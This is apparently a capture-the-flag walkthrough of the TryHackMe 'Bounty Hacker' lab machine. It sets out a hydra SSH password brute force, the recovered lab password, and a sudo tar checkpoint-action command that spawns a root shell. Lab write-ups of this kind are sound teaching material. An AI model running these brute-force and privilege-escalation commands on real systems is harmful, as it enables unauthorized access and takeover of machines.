# cowboyhacker `Bounty Hacker` | CTF Machine 

## Tools && Sources

1. [tryenum](https://github.com/alauthor/enum-tryhackme-machine)
2. ftp 
3. ssh 
4. [gtfobins](https://gtfobins.github.io/)

## steps to get two flags 
```bash
./tryenum.sh 10.10.x.x
[+] http port 80 is open  
[+] open ports 21,22,80
[+] after scan complete go to SCAN/NAMP | cat full_scan_result file 
[+] we have ftp anonymous login allowed 
[+] login to ftp will find two files one contains wordlist `locks.txt` the other contain a user `task.txt`
[+] downlaod the two files | mget *
[+] cat task.txt | we got the username `lin`
[+] brute force ssh | hydra hydra -F -V -I -l lin -P locks.txt 10.10.47.187 ssh | password found `RedDr4gonSynd1cat3`
[+] connect to ssh using user lin and password `RedDr4gonSynd1cat3`
[+] cat user.txt | flag-1
[+] sudo -l | we can run tar as root   
[+] open gtfobins and search for tar | use this command to get root `sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh`
[+] now we are root | cat /root/root.txt | flag-2
```
## STEP-1
```bash
now we know that port 21,22,80 opens 
```
<img src="https://github.com/alauthor/Tryhackme-CTF/blob/main/cowboyhacker/imgs/2022-07-10%2001_25_03-VirtualBoxVM.png">

## STEP-2
```bash
login to ftp | ftp 10.10.47.187
download the two files 
mget *
cat task.txt | the username to access to login using ssh is `lin`
```
## STEP-3
```bash
let's brute force to get the right password 
hydra hydra -F -V -I -l lin -P locks.txt 10.10.47.187 ssh | password found `RedDr4gonSynd1cat3`
ssh lin@10.10.47.187
cat user.txt | flag-1
sudo -l | Oooooh we can run the tar as root 
go to gtfobins website and search for tar | use this command `sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh`
once you're root | cat /root/root.txt | flag-2
```
<img src="https://github.com/alauthor/Tryhackme-CTF/blob/main/cowboyhacker/imgs/2022-07-10%2000_34_41-VirtualBoxVM.png">
<img src="https://github.com/alauthor/Tryhackme-CTF/blob/main/cowboyhacker/imgs/2022-07-10%2000_35_05-VirtualBoxVM.png">
<img src="https://github.com/alauthor/Tryhackme-CTF/blob/main/cowboyhacker/imgs/2022-07-10%2000_35_19-VirtualBoxVM.png">
